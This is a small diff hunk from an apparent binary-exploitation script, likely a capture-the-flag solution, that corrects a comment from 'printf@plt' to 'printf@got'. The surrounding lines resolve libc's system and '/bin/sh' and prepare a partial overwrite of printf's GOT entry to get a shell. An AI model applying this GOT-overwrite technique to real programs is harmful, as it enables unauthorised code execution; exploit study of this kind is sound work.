@@ -44,7 +44,7 @@ print("System: " + hex(system))
 bin_sh = next(libc.search(b'/bin/sh'))
 print("/bin/sh: " + hex(bin_sh))
 
-# Overwrite printf@plt to system
+# Overwrite printf@got to system
 # GDB()
 system = system >> 8 & 0xffff
 print("Target: " + hex(system))
